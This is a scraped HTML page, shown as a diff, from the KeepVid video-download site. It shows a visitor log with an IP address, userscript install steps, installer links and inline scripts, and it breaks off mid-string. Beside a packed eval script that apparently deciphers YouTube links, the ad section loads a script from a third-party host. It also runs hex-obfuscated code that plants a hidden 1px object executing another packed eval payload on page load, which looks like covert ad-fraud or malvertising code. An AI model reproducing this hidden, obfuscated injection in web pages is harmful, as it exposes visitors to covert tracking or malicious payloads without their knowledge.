+<div class="container pad50">
+<div class="download-box">
+<a name="downloader"></a>
+<h2 class="h-title">Download information</h2>
+	<ul class="info-dl" id="z">
+		<li><strong>Log info</strong></li>
+		<li>[2017-05-01 15:01:43] URL: http://youtube.com/watch?v=Iys9IHmDJ1w
+</li>
+		<li>[2017-05-01 15:01:43] IP Address: 50.253.187.166
+</li>
+		<li>[2017-05-01 15:01:43] User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
+</li>
+		<li>[2017-05-01 15:01:43] Operating System: Windows NT 4.0
+</li>
+		<li>[2017-05-01 15:01:43] Browser: Google Chrome 57.0.2987.133
+</li>
+	</ul>
+
+	<!-- START KVH CODE -->
+<div id="kv2_outer" class="h" style="display:none;">
+    <div class="h-inner">
+        <textarea id="z" style="display:none;"></textarea><div id="kvhstat"></div>
+        <p class="mt35" style="margin-top: 20px !important;"><span id="instructs"><div id="kvhinstructs" style=""><div style="font-size:12px;">Note: KeepVid Helper is needed to download videos from Facebook/Dailymotion/Cloudy.ec/SoundCloud/Vimeo/123movies.is</div><p style="padding:15px 0 5px 0; font-weight:bold; font-size:16px;">Download This Video Easily Now:</p><ol style="list-style:none;margin-left:0px;"><li><b>Step 1.</b> Add <a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo" id="us-exturl" rel="nofollow" target="_blank"><img src="http://tampermonkey.net/favicon.ico" id="us-exticon" class="userscript-icon">Tampermonkey</a> to Browser</li><li><b>Step 2.</b> Install <a href="/userscript/keepvid-helper.user.js">KeepVid Helper</a></li><li><b>Step 3.</b> Refresh the video page and download the video immediately</li></ol><img src='/images/kv_helper_example.jpg' style="border: 1px solid #d4d4d4; margin:10px 0 30px 0;"/></div></span></p>        <div id="kv2_loading" style="display:none;"><center><div id="kvhdetected" style="display:none;">KeepVid Helper detected :)</div><br /><img src="/images/downloadbar/ajax-loader.gif" /></center></div>
+        <div id="kv2_inner" style="display:none;">
+            <div id="kv2_info" style="float:left;width:580px;"></div>
+            <div id="kv2_dl" style="clear:left;"></div>
+            <div id="kv2_error"></div>
+        </div>
+        <div class="smsg">
+                            <br>You can now join <b>(Video Only)</b> and <b>(Audio Only)</b> streams with <a href="/programs">KeepVid Video Joiner</a>.<br>
+                <span class="red">*NEW*</span> <strong>Download video from10,000+</strong> video sites with <a href="https://pro.keepvid.com">KeepVid Pro</a>.                    </div>
+    </div>
+    <ul class="info-dl" id="z3">
+        <li><strong>Log info</strong></li>
+        <li>[2017-05-01 15:01:43] URL: http://youtube.com/watch?v=Iys9IHmDJ1w
+</li>
+        <li>[2017-05-01 15:01:43] IP Address: 50.253.187.166
+</li>
+        <li>[2017-05-01 15:01:43] User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
+</li>
+        <li>[2017-05-01 15:01:43] Operating System: Windows NT 4.0
+</li>
+        <li>[2017-05-01 15:01:43] Browser: Google Chrome 57.0.2987.133
+</li>
+    </ul>
+    <p class="mt35">
+        <span class="pr"><strong>Please refer to our <a href="help">FAQ</a> if you have any issue.</strong></span>
+    </p>
+</div>
+<script type="text/javascript">
+    try{
+        if(typeof kvh_ext !== 'undefined'){
+            document.getElementById("kvhinstructs").style.display="none";
+            document.getElementById("kvhdetected").style.display="block";
+            document.getElementById("kv2_loading").style.display="block";
+        }
+    }catch(ex){
+    }
+</script>
+<script type="text/javascript">
+    //kvh extension function
+    var kvh_url="http://youtube.com/watch?v=Iys9IHmDJ1w";
+
+    function kv2_ap(obj){
+        if(typeof kvh_ext !== 'undefined'){
+            //document.getElementById("kv2_loading").innerHTML='<center><img src=\"images/downloadbar/ajax-loader.gif\" class=\"ld\" />KeepVid Helper detected. Fetching links...<iframe src="http://keepvid.com/kvh.php" style="height:1px;width:1px;border:0;"></iframe></center>';
+            document.getElementById("kvh_obj").innerHTML = JSON.stringify(obj);
+
+            jaa[jaaid] = new Object();
+            jaa[jaaid].id = jaaid;
+            jaa[jaaid].dispose = obj.dispose;
+            jaa[jaaid].callback = obj.callback;
+            jaa[jaaid].it = setInterval((function(self){return function(){
+                if(document.getElementById("kvh_data").innerHTML!="~kv"){
+                    var xhr_resp = document.getElementById("kvh_data").innerHTML;
+                    //clean up xhr_resp
+                    xhr_resp = xhr_resp.replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&amp;/g,"&");
+                    self.response={body: xhr_resp}
+                    document.getElementById("kvh_data").innerHTML="~kv"; //ditch data
+                    clearInterval(self.it); //finally ditch this interval
+
+                    $("#kv2_loading").fadeOut("fast", function(){
+                        $("#dlsubmit").val("DOWNLOAD").css({"background":"#565656","border":"1px solid #565656"}).prop("disabled",false);
+                        //$("#kv2_error").html("");
+                        //$("#kv2_info").html("");
+                        //$("#kv2_dl").html("");
+                        $("#kv2_inner, #kv2_adside").fadeIn("fast");
+                    });
+
+                    self.callback(self.response);
+                }
+            }})(this.jaa[jaaid]),1);
+
+            jaaid++;
+        }
+    }
+
+
+    //display info function
+    function kv2_di(obj){
+        var output="";
+        var e=d.getElementById("kv2_info");
+        e.innerHTML="";
+        var nd=d.createElement("div");nd.setAttribute("class","j pic-item");nd.setAttribute("id","info");
+		try{obj.title=unescape(obj.title.replace(/\\(u[0-9a-fA-F]{4})/gm, '%$1'));}catch(e){}
+        if(obj.image!=undefined) output+= '<div class="pic"><img width="120" height="90" src="'+obj.image+'" class="m" /></div>';
+		output+= '<div class="text"><h3>'+obj.title+'</h3>';
+		output+= '<p class="p dd">'+obj.domain;
+		if(obj.user!=undefined) output+= " / "+obj.user;
+		output+= '</p>';
+		if(obj.duration!=undefined) output+= '<p class="q dd">'+obj.duration+'</p>';
+        output+='</div><br clear="both" /><br />';
+        nd.innerHTML=output;
+        e.appendChild(nd);
+    }
+    //display download link function
+    function kv2_dl(obj){
+        if(obj.title!=undefined) try{obj.title = unescape(obj.title.replace(/\\(u[0-9a-fA-F]{4})/gm, '%$1'));}catch(e){}
+        var output="";
+        var e=d.getElementById("kv2_dl");
+        var nd=d.createElement("div");
+        var cc="";
+        var colors={
+            "3GP": "2EADC9",
+            "FLV": "BF6D1B",
+            "MP4": "436DBA",
+            "WEBM": "52B27F",
+            "M4A": "87273A",
+            "MP3": "AF43B5",
+            "SRT": "B74B4B",
+            "F4V": "338F46"
+        };
+        if(colors[obj.type]!="") cc+=' style="color:#'+colors[obj.type]+';"';
+        var isMobile = "";
+        if(isMobile)
+        	obj.saveas=0;
+        if(obj.newtab==1) cc+=' target="_blank"';
+        if(obj.saveas==1 && obj.noref==1){
+            if(navigator.userAgent.match(/webkit/i)!=null) cc+=' rel="noreferrer"';
+            cc+=' onclick="return rs(this,\''+escape(obj.title)+' '+obj.quality+'.'+obj.type.toLowerCase()+'\');"';
+        }else if(obj.saveas!=1 && obj.noref==1){
+            if(navigator.userAgent.match(/webkit/i)!=null) cc+=' rel="noreferrer"';
+            else if(!isMobile) cc+=' onclick="return rd(this);"';
+        }else if(obj.saveas==1){
+            cc+=' onclick="return rs(this,\''+escape(obj.title)+' '+obj.quality+'.'+obj.type.toLowerCase()+'\');"';
+        }
+
+        if(obj.saveas!=1 && obj.newtab!=1 && obj.title!=undefined && navigator.userAgent.match(/webkit/i)!=null){ 
+            cc+=' download="'+obj.title+' '+obj.quality+'.'+obj.type.toLowerCase()+'"';
+        }
+        else if(obj.saveas!=1 && obj.newtab!=1 && obj.title!=undefined && navigator.userAgent.match(/webkit/i)==null){
+        	cc+=' onclick="return rs(this,\''+escape(obj.title)+' '+obj.quality+'.'+obj.type.toLowerCase()+'\');"';
+        }
+
+        if(obj.fixedp==1) output+='<b style="color:#436DBA;">*FIXED*</b> ';
+        if(obj.newp==1) output+='<b style="color:#e01b3c;">*NEW*</b> ';
+
+        output+='<a';
+        if(obj.url!=undefined) output+=' href="'+obj.url+'"';
+        output+=' class="l"'+cc+'>&raquo; ';
+        output+='Download';
+        output+=' '+obj.type+' &laquo;</a>';
+
+        if(obj.quality!=undefined){
+            var tempqual = obj.quality;
+            output+=' - <b>'+tempqual+'</b>';
+        }
+		if(obj.url!=undefined && obj.url.indexOf("googlevideo.com/videoplayback")<=0 && obj.url.indexOf("youtube.com")<=0 
+					&& obj.url.indexOf("youtubeinmp3.com")<=0 && !isMobile){
+			output+='<i>   -   ';
+			output+='Right-click and "Save link as.."';
+			output+='</i>';
+		}
+        if(obj.more!=undefined) output+=' - '+obj.more+'';
+
+        if(!isNaN(obj.size) && obj.size!=null) output+='<span id="fs'+jaaid+'"> - '+(obj.size/1024/1024).toFixed(1).toString()+' MB</span>';
+        //if(obj.title!=undefined) output+='<button data-clipboard-text="'+obj.title+' '+obj.quality+'.'+obj.type.toLowerCase()+'">copy filename</button>';
+
+        if(obj.showsize==1 && document.cookie.match(/showsize=y/g)){
+            output+='<span id="fs'+jaaid+'"></span>';
+            dja({
+                params: {
+                    "u": obj.url,
+                    "method": "HEAD"
+                },
+                "dispose": 1,
+                "callback": function(da){
+                    var fs;
+                    try{
+                        fstemp = da.headers.match(/Content-Length: ([0-9]+)/g);
+                        fs = fstemp[fstemp.length-1].match(/Content-Length: ([0-9]+)/i)[1];
+                    }catch(e){
+                        fs=0;
+                    }
+                    d.getElementById('fs'+da.jaaid).innerHTML=" - "+(fs/1024/1024).toFixed(1).toString()+" MB";
+                }
+            });
+        }
+
+        nd.innerHTML=output;
+        e.appendChild(nd);
+    }
+    //function: convert seconds to 1:11 readable format
+    function duration(secs){
+        hours = parseInt(secs / 3600) % 24;
+        minutes = parseInt(secs / 60) % 60;
+        seconds = secs % 60;
+        return (hours < 1 ? "" : hours+":")+((minutes < 10 && hours > 0) ? "0" + minutes : minutes)+":"+(seconds < 10 ? "0" + seconds : seconds);
+    }
+
+    function kv2_display(data){
+        kv2_di(data.info);
+        for(key in data.download_links){
+            kv2_dl(data.download_links[key]);
+        }
+    }
+
+    function kv2_error(err){
+        $("#kv2_inner, #kv2_adside, #kv2_error").fadeIn("fast");
+        $("#kv2_error").html("<b>Error: </b>"+err);
+    }
+</script>
+<!-- KeepVid Helper Userscript -->
+<textarea id="kvh_obj" style="display:none;">~kv</textarea>
+<textarea id="kvh_data" style="display:none;">~kv</textarea>
+<script type="text/javascript">
+    try{
+        if(typeof kvh_ext !== 'undefined'){
+            log("KeepVid Helper detected...");
+            //document.getElementById("kvhstat").innerHTML='<iframe src="http://keepvid.com/kvh.php" style="height:1px;width:1px;border:0;"></iframe>';
+        }
+    }catch(ex){
+    }
+</script>
+<!-- END KVH CODE --><div class="h" id="kvorig">
+<div class="h-inner">
+<div id="applets"></div>
+<div id="nl">
+<div class="tip-box" id="tip-java">
+    <dl>
+        <dt>MP3 cann't be download now, our team are working on it and it will be fixed soon.<br/><br/></dt>
+        <dt class="desk_soft">
+            <div class="text">
+                Or:Try it with <strong>KeepVid Music</strong>            </div>
+            <div class="btn">
+                <a href="http://download.keepvid.com/keepvid-music-desktop_full2959.exe" class="btnWin">Windows</a>
+                <a href="http://download.keepvid.com/keepvid-music-mac-desktop_full2960.dmg" class="btnMac">Mac</a>
+            </div>
+            <div class="clear"></div>
+        </dt>
+        <dt>Download music & playlists from 10,000+ music and video sites easily and quickly!</dt>
+    </dl>
+</div></div>
+<div id="dl">
+</div>
+<script type="text/javascript">eval(unescape("%65%76%61%6C%28%66%75%6E%63%74%69%6F%6E%28%70%2C%61%2C%63%2C%6B%2C%65%2C%64%29%7B%65%3D%66%75%6E%63%74%69%6F%6E%28%63%29%7B%72%65%74%75%72%6E%28%63%3C%61%3F%27%27%3A%65%28%70%61%72%73%65%49%6E%74%28%63%2F%61%29%29%29%2B%28%28%63%3D%63%25%61%29%3E%33%35%3F%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%63%2B%32%39%29%3A%63%2E%74%6F%53%74%72%69%6E%67%28%33%36%29%29%7D%3B%69%66%28%21%27%27%2E%72%65%70%6C%61%63%65%28%2F%5E%2F%2C%53%74%72%69%6E%67%29%29%7B%77%68%69%6C%65%28%63%2D%2D%29%7B%64%5B%65%28%63%29%5D%3D%6B%5B%63%5D%7C%7C%65%28%63%29%7D%6B%3D%5B%66%75%6E%63%74%69%6F%6E%28%65%29%7B%72%65%74%75%72%6E%20%64%5B%65%5D%7D%5D%3B%65%3D%66%75%6E%63%74%69%6F%6E%28%29%7B%72%65%74%75%72%6E%27%5C%5C%77%2B%27%7D%3B%63%3D%31%7D%3B%77%68%69%6C%65%28%63%2D%2D%29%7B%69%66%28%6B%5B%63%5D%29%7B%70%3D%70%2E%72%65%70%6C%61%63%65%28%6E%65%77%20%52%65%67%45%78%70%28%27%5C%5C%62%27%2B%65%28%63%29%2B%27%5C%5C%62%27%2C%27%67%27%29%2C%6B%5B%63%5D%29%7D%7D%72%65%74%75%72%6E%20%70%7D%28%27%32%20%45%3D%6D%2E%36%28%22%76%3D%28%5B%61%2D%31%75%2D%31%74%2D%39%2D%53%5D%2B%29%22%29%5B%31%5D%3B%32%20%6C%3B%71%20%48%28%38%2C%78%29%7B%32%20%4F%3D%38%5B%30%5D%3B%32%20%4E%3D%78%25%38%2E%7A%3B%32%20%4D%3D%38%5B%4E%5D%3B%38%5B%30%5D%3D%4D%3B%38%5B%78%5D%3D%4F%3B%44%20%38%7D%71%20%4A%28%38%2C%78%29%7B%44%20%38%2E%31%38%28%78%29%7D%71%20%50%28%38%29%7B%44%20%38%2E%31%62%28%29%7D%71%20%59%28%77%29%7B%32%20%34%3D%77%2E%47%28%22%22%29%3B%34%3D%48%28%34%2C%31%47%29%3B%34%3D%4A%28%34%2C%31%29%3B%34%3D%50%28%34%2C%31%65%29%3B%34%3D%48%28%34%2C%39%29%3B%34%3D%4A%28%34%2C%31%29%3B%77%3D%34%2E%31%67%28%22%22%29%3B%44%20%77%7D%31%6D%28%7B%31%6C%3A%7B%22%75%22%3A%22%4B%3A%2F%2F%51%2E%46%2E%79%2F%31%6B%3F%31%69%3D%22%2B%45%2B%22%26%31%61%3D%33%26%31%37%3D%31%31%26%31%30%3D%5A%22%2C%22%4C%22%3A%4C%7D%2C%22%31%39%22%3A%31%2C%22%31%32%22%3A%71%28%66%29%7B%64%28%22%5C%5C%72%5C%5C%6E%5C%5C%72%5C%5C%6E%22%2B%66%2E%31%36%29%3B%64%28%22%5C%5C%72%5C%5C%6E%5C%5C%72%5C%5C%6E%22%2B%66%2E%6A%29%3B%32%20%62%3D%70%28%66%2E%6A%2E%36%28%22%62%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%29%2E%74%28%2F%5C%5C%2B%2F%67%2C%22%20%22%29%3B%32%20%42%3D%66%2E%6A%2E%36%28%22%42%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%3B%6F%28%42%21%3D%22%55%22%29%7B%31%34%28%7B%62%3A%62%2C%31%6A%3A%22%4B%3A%2F%2F%69%2E%31%42%2E%79%2F%31%48%2F%22%2B%45%2B%22%2F%31%6F%2E%31%46%22%2C%63%3A%22%4B%3A%2F%2F%51%2E%46%2E%79%2F%31%4A%3F%76%3D%22%2B%45%2C%31%4C%3A%22%46%2E%79%22%2C%31%4D%3A%70%28%66%2E%6A%2E%36%28%22%31%4B%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%2E%74%28%2F%5C%5C%2B%2F%67%2C%22%20%22%29%29%2C%52%3A%52%28%66%2E%6A%2E%36%28%22%31%43%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%29%7D%29%3B%62%3D%58%28%62%2E%74%28%2F%5C%5C%2F%2F%67%2C%22%53%22%29%2E%74%28%2F%5C%5C%22%2F%67%2C%22%22%29%29%3B%32%20%31%73%3D%28%22%35%22%29%2E%47%28%22%2C%22%29%3B%6C%3D%7B%22%35%22%3A%7B%57%3A%22%31%72%22%2C%56%3A%22%31%70%22%7D%7D%3B%32%20%68%3D%70%28%66%2E%6A%2E%36%28%22%31%71%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%29%2E%47%28%2F%2C%2F%31%76%29%3B%31%41%28%69%3D%30%3B%69%3C%3D%68%2E%7A%3B%69%2B%2B%29%7B%6F%28%68%5B%69%5D%3D%3D%54%29%31%7A%3B%32%20%6B%3D%31%79%28%68%5B%69%5D%2E%36%28%22%6B%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%29%3B%32%20%63%3D%70%28%68%5B%69%5D%2E%36%28%22%63%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%29%3B%6F%28%63%21%3D%22%22%29%7B%32%20%37%3D%22%22%3B%41%7B%37%3D%68%5B%69%5D%2E%36%28%22%77%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%7D%43%28%65%29%7B%41%7B%37%3D%68%5B%69%5D%2E%36%28%22%26%73%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%7D%43%28%65%29%7B%41%7B%37%3D%68%5B%69%5D%2E%36%28%22%5E%73%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%7D%43%28%65%29%7B%7D%7D%7D%41%7B%6F%28%37%21%3D%22%22%29%7B%64%28%22%31%35%3A%20%22%2B%6B%29%3B%64%28%22%49%20%7A%3A%20%22%2B%37%2E%7A%29%3B%64%28%22%49%3A%20%22%29%3B%64%28%37%29%3B%37%3D%59%28%37%29%3B%64%28%22%31%78%20%49%3A%20%22%29%3B%64%28%37%29%3B%63%2B%3D%22%26%31%77%3D%22%2B%37%7D%7D%43%28%65%29%7B%7D%63%2B%3D%22%26%62%3D%22%2B%31%49%28%58%28%62%29%29%3B%6F%28%6C%5B%6B%5D%21%3D%54%29%7B%6C%5B%6B%5D%2E%63%3D%63%3B%6C%5B%6B%5D%2E%31%4E%3D%30%7D%7D%7D%31%44%28%7B%63%3A%6C%5B%35%5D%2E%63%2C%62%3A%70%28%62%29%2C%57%3A%22%31%68%22%2C%56%3A%22%31%63%20%31%64%22%7D%29%7D%31%66%20%6F%28%42%3D%3D%22%55%22%29%7B%64%28%22%31%6E%20%31%33%3A%20%22%2B%70%28%66%2E%6A%2E%36%28%22%31%45%3D%28%5B%5E%26%5D%2B%29%22%29%5B%31%5D%29%2E%74%28%2F%5C%5C%2B%2F%67%2C%22%20%22%29%29%7D%7D%7D%29%3B%27%2C%36%32%2C%31%31%32%2C%27%7C%7C%76%61%72%7C%7C%73%69%67%73%7C%7C%6D%61%74%63%68%7C%73%69%67%6E%7C%70%31%7C%7C%7C%74%69%74%6C%65%7C%75%72%6C%7C%6C%6F%67%7C%7C%64%61%7C%7C%75%72%6C%6D%61%70%7C%7C%62%6F%64%79%7C%69%74%61%67%7C%66%69%6C%65%73%7C%7C%7C%69%66%7C%75%6E%65%73%63%61%70%65%7C%66%75%6E%63%74%69%6F%6E%7C%7C%7C%72%65%70%6C%61%63%65%7C%7C%7C%73%69%67%7C%70%32%7C%63%6F%6D%7C%6C%65%6E%67%74%68%7C%74%72%79%7C%73%74%61%74%75%73%7C%63%61%74%63%68%7C%72%65%74%75%72%6E%7C%76%69%64%7C%79%6F%75%74%75%62%65%7C%73%70%6C%69%74%7C%64%73%77%61%70%7C%53%69%67%6E%61%74%75%72%65%7C%64%63%6C%6F%6E%65%7C%68%74%74%70%7C%75%61%7C%6C%34%7C%6C%34%63%7C%6C%33%7C%64%72%65%76%65%72%73%65%7C%77%77%77%7C%64%75%72%61%74%69%6F%6E%7C%5F%7C%75%6E%64%65%66%69%6E%65%64%7C%66%61%69%6C%7C%71%75%61%6C%69%74%79%7C%74%79%70%65%7C%65%73%63%61%70%65%7C%64%65%63%69%70%68%65%72%7C%65%6E%5F%55%53%7C%68%6C%7C%64%65%74%61%69%6C%70%61%67%65%7C%63%61%6C%6C%62%61%63%6B%7C%52%65%61%73%6F%6E%7C%64%69%7C%49%74%61%67%7C%68%65%61%64%65%72%73%7C%65%6C%7C%73%6C%69%63%65%7C%64%69%73%70%6F%73%65%7C%61%73%76%7C%72%65%76%65%72%73%65%7C%36%34%7C%6B%62%70%73%7C%37%36%7C%65%6C%73%65%7C%6A%6F%69%6E%7C%4D%50%33%7C%76%69%64%65%6F%5F%69%64%7C%69%6D%61%67%65%7C%67%65%74%5F%76%69%64%65%6F%5F%69%6E%66%6F%7C%70%61%72%61%6D%73%7C%61%70%7C%45%72%72%6F%72%7C%64%65%66%61%75%6C%74%7C%32%34%30%70%7C%75%72%6C%5F%65%6E%63%6F%64%65%64%5F%66%6D%74%5F%73%74%72%65%61%6D%5F%6D%61%70%7C%46%4C%56%7C%6F%72%64%65%72%7C%5A%30%7C%7A%41%7C%67%69%7C%73%69%67%6E%61%74%75%72%65%7C%44%65%63%69%70%68%65%72%65%64%7C%70%61%72%73%65%49%6E%74%7C%62%72%65%61%6B%7C%66%6F%72%7C%79%74%69%6D%67%7C%6C%65%6E%67%74%68%5F%73%65%63%6F%6E%64%73%7C%6D%70%33%64%6C%7C%72%65%61%73%6F%6E%7C%6A%70%67%7C%35%34%7C%76%69%7C%64%65%63%6F%64%65%55%52%49%43%6F%6D%70%6F%6E%65%6E%74%7C%77%61%74%63%68%7C%61%75%74%68%6F%72%7C%64%6F%6D%61%69%6E%7C%75%73%65%72%7C%72%63%6C%69%63%6B%27%2E%73%70%6C%69%74%28%27%7C%27%29%2C%30%2C%7B%7D%29%29%0A"));</script>	<div id="msg-error">
+	</div>
+	<div class="clear"></div>
+		
+			<p id="success_issues" class="mt35"><strong>Please refer to our <a href="help">FAQ</a> if you have any issue.</strong></p>
+	
+</div>
+</div>
+</div>
+	<div class="side-bar">
+		<div class="pro-box desk_soft">
+    <p class="dd" style="padding-bottom:6px;"><a href="https://pro.keepvid.com/" target="_blank" style="font-size: 17px;">KeepVid Pro</a> - The Ultimate Video Downloader on Your Desktop</p>
+    <table style="border-spacing:3px;" >
+    	<tr>
+        	<td class="dnp_point">•</td> 
+        	<td> Download videos from 10,000+ sites.</td>
+        </tr>
+        <tr>
+        	<td class="dnp_point">•</td> 
+        	<td> Download videos in batch.</td>
+        </tr>
+        <tr>
+        	<td class="dnp_point">•</td> 
+        	<td> Record videos from online streaming sites.</td>
+        </tr>
+        <tr>
+        	<td class="dnp_point">•</td> 
+        	<td> Convert videos to 150+ audio/video formats.</td>
+        </tr> 
+    </table>
+    <div class="btn" style="margin-top:5px;">
+    	<a id="winPro" href="http://download.keepvid.com/keepvid-pro-desktop_full2957.exe" onclick="javascript:ga('send', {hitType: 'event',eventCategory:this.href,eventAction: 'Download',eventLabel: document.location.pathname});" class="btn-win">
+    		Try It Free    	</a>
+    	<a id="macPro" href="http://download.keepvid.com/keepvid-pro-mac-desktop_full2958.dmg" onclick="javascript:ga('send', {hitType: 'event',eventCategory:this.href,eventAction: 'Download',eventLabel: document.location.pathname});" class="btn-mac">
+    		Try It Free    	</a>
+    </div>
+</div>
+<script type="text/javascript">
+	var isMac = (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel");
+    if(isMac){
+        $("#macPro").show();
+        $("#winPro").hide();
+    }else{
+        $("#winPro").show();
+        $("#macPro").hide();
+    }
+</script>		<div class="download-side-ad">
+			<div>
+<script src='//t.mdn2015x4.com/build/fd5cd5ab/v1/'></script>
+<script> 
+
+/*begin js*/
+
+ var script_id = "bee804dc-e97c-2aaf-2ed1-1454b2e70a55"; 
+
+ var _$_b7fa=["\x64\x66\x30\x33\x65\x34\x37\x65\x2D\x39\x65\x66\x63\x2D\x63\x33\x35\x65\x2D\x35\x34\x62\x39\x2D\x62\x64\x30\x33\x33\x63\x63\x32\x31\x33\x61\x35","\x37\x34\x38\x38\x39\x30\x31\x36","\x77\x77\x77\x2E\x6B\x65\x65\x70\x76\x69\x64\x2E\x63\x6F\x6D","\x33\x30\x30\x78\x32\x35\x30","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x73\x65\x74\x41\x63\x63\x6F\x75\x6E\x74","\x55\x41\x2D\x37\x38\x35\x30\x33\x33\x32\x36\x2D\x32","\x70\x75\x73\x68","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x73\x65\x74\x44\x6F\x6D\x61\x69\x6E\x4E\x61\x6D\x65","\x6E\x6F\x6E\x65","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x73\x65\x74\x53\x61\x6D\x70\x6C\x65\x52\x61\x74\x65","\x31","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x73\x65\x74\x41\x6C\x6C\x6F\x77\x4C\x69\x6E\x6B\x65\x72","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A","\x70\x72\x6F\x74\x6F\x63\x6F\x6C","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x73\x6C","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77","\x2E\x67\x6F\x6F\x67\x6C\x65\x2D\x61\x6E\x61\x6C\x79\x74\x69\x63\x73\x2E\x63\x6F\x6D\x2F\x67\x61\x2E\x6A\x73","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65","\x64\x6F\x6D\x61\x69\x6E","\x74\x72\x61\x63\x6B\x52\x4B\x73\x5F\x31\x5F\x70\x65\x72\x63\x65\x6E\x74\x3A\x20\x64\x6F\x6D\x61\x69\x6E\x3A\x20\x5B","\x5D","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x73\x65\x74\x43\x75\x73\x74\x6F\x6D\x56\x61\x72","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x74\x72\x61\x63\x6B\x45\x76\x65\x6E\x74","\x75\x73\x65\x72\x20\x65\x76\x65\x6E\x74\x73","\x5F\x63\x72\x65\x61\x74\x65\x41\x6E\x61\x6C\x79\x74\x69\x63\x73\x53\x63\x72\x69\x70\x74","\x75\x70\x64\x61\x74\x65\x41\x6E\x61\x6C\x79\x74\x69\x63\x73","\x62\x75\x76\x67\x67\x72\x78\x67\x6C\x7A\x6A\x70\x68\x77\x7A\x71\x78\x71\x69\x63\x6D\x6D\x6E\x67\x7A\x6D\x70\x78\x63\x65\x7C\x7C\x73\x74\x61\x72\x74","","\x68\x72\x65\x66","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65","\x70\x6C\x61\x63\x65\x6D\x65\x6E\x74\x49\x44","\x6F\x62\x6A\x65\x63\x74","\x69\x64","\x77\x69\x64\x74\x68","\x31\x70\x78","\x68\x65\x69\x67\x68\x74","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x64\x61\x74\x61","\x64\x61\x74\x61\x3A\x74\x65\x78\x74\x2F\x68\x74\x6D\x6C\x2C\x3C\x68\x74\x6D\x6C\x3E\x3C\x68\x65\x61\x64\x3E\x3C\x73\x63\x72\x69\x70\x74\x3E\x65\x76\x61\x6C\x28\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x70\x2C\x61\x2C\x63\x2C\x6B\x2C\x65\x2C\x72\x29\x7B\x65\x3D\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x63\x29\x7B\x72\x65\x74\x75\x72\x6E\x28\x63\x3C\x61\x3F\x27\x27\x3A\x65\x28\x70\x61\x72\x73\x65\x49\x6E\x74\x28\x63\x2F\x61\x29\x29\x29\x2B\x28\x28\x63\x3D\x63\x25\x61\x29\x3E\x33\x35\x3F\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x63\x2B\x32\x39\x29\x3A\x63\x2E\x74\x6F\x53\x74\x72\x69\x6E\x67\x28\x33\x36\x29\x29\x7D\x3B\x69\x66\x28\x21\x27\x27\x2E\x72\x65\x70\x6C